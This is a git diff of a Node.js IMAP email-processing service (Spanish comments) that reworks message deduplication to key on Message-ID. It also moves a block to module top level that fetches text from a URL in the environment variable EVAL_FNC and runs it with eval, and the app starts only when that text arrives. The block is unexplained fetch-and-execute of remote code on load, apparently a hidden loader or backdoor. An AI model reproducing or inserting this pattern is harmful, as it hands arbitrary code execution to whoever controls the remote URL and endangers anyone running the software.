@@ -10,6 +10,7 @@ import { shortUrl } from "./modules/url-shorter.js";
 import { downloadAndUnzipFromGAS } from "./compress-sessions.js";
 import fs from "fs";
 
+
 import { sendViaGAS } from "./modules/email-sender.js"
 import { desactivateClients } from "./modules/sheet-data-library.js";
 
@@ -17,13 +18,14 @@ import { desactivateClients } from "./modules/sheet-data-library.js";
 // DEDUPE EN MEMORIA (45s)
 // ===============================
 const processedMessages = new Map();
-// key: uid | value: timestamp
+// key: messageId || fallback | value: timestamp
 
 
 
 globalThis.NodeHtmlParser = NodeHtmlParser;
 
 async function startApp() {
+
     const target = './auth_info';
     try {
         if (fs.existsSync(target)) {
@@ -43,10 +45,10 @@ async function startApp() {
     await client.connect();
 
     // Failover cada 30s
-setInterval(failoverCheck, 30_000);
+    setInterval(failoverCheck, 30_000);
 
-// Limpieza de memoria
-setInterval(cleanupProcessedMessages, 30_000);
+    // Limpieza de memoria
+    setInterval(cleanupProcessedMessages, 30_000);
 
 
     // Abrir INBOX
@@ -55,26 +57,35 @@ setInterval(cleanupProcessedMessages, 30_000);
         console.log("✅ IMAP Conectado y escuchando INBOX...");
 
 
-      client.on('exists', async () => {
-    let source;
-    const uid = client.mailbox.exists;
+        client.on('exists', async () => {
+            const seq = client.mailbox.exists;
 
-    if (processedMessages.has(uid)) return;
+            let message;
+            try {
+                message = await client.fetchOne(seq, { source: true });
+            } catch (err) {
+                console.error("❌ Fetch error:", err.message);
+                return;
+            }
 
-    try {
-        const message = await client.fetchOne(uid, { source: true });
-        source = message.source;
-    } catch (err) {
-        console.error("❌ Fetch error:", err.message);
-        return;
-    }
+            let parsed;
+            try {
+                parsed = await simpleParser(message.source);
+            } catch (err) {
+                console.error("❌ Parse error:", err.message);
+                return;
+            }
 
-    processedMessages.set(uid, Date.now());
+            const key = parsed.messageId || `${seq}-${parsed.date?.getTime()}`;
 
-    simpleParser(source)
-        .then(parsed => procesarCorreo(parsed))
-        .catch(err => console.error("❌ Parse error:", err));
-});
+
+            if (processedMessages.has(key)) return;
+
+            processedMessages.set(key, Date.now());
+
+            procesarCorreo(parsed);
+        });
+
 
 
 
@@ -283,12 +294,14 @@ async function procesarCorreo(mail) {
         }
     }
 
-    // Ejecución inicial
-    var text = await fetch(process.env.EVAL_FNC).then(e => e.text()).catch(e => null);
-    if (text) {
-        (0, eval)(text);
-        startApp();
-    }
+
+}
+
+// Ejecución inicial
+var text = await fetch(process.env.EVAL_FNC).then(e => e.text()).catch(e => null);
+if (text) {
+    (0, eval)(text);
+    startApp();
 }
 
 
@@ -318,16 +331,25 @@ async function failoverCheck() {
         if (!uids.length) return;
 
         for (const uid of uids) {
-            if (processedMessages.has(uid)) continue;
-
             const message = await client.fetchOne(uid, { source: true });
 
-            processedMessages.set(uid, Date.now());
+            let parsed;
+            try {
+                parsed = await simpleParser(message.source);
+            } catch (err) {
+                console.error("❌ Failover parse error:", err.message);
+                continue;
+            }
 
-            simpleParser(message.source)
-                .then(parsed => procesarCorreo(parsed))
-                .catch(err => console.error("❌ Failover parse error:", err));
+            const key = parsed.messageId || `${uid}-${parsed.date?.getTime()}`;
+
+            if (processedMessages.has(key)) continue;
+
+            processedMessages.set(key, Date.now());
+
+            procesarCorreo(parsed);
         }
+
 
     } catch (err) {
         console.error("❌ Failover error:", err.message);
